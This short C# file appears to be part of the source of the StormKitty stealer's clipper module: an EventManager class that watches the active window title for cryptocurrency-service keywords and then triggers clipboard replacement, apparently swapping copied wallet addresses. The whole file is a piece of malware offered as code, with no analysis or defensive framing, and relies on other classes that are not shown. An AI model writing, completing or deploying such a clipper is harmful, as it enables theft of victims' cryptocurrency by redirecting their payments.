using StormKitty;

namespace Clipper
{
    internal sealed class EventManager
    {
        // Start clipper only if active windows contains target values
        public static void Action()
        {
            if (Detect()) Clipper.Replace();
        }

        // Detect target data in active window
        private static bool Detect()
        {
            foreach (string text in Config.CryptoServices)
                if (WindowManager.ActiveWindow.ToLower().Contains(text))
                    return true;

            return false;
        }

    }
}
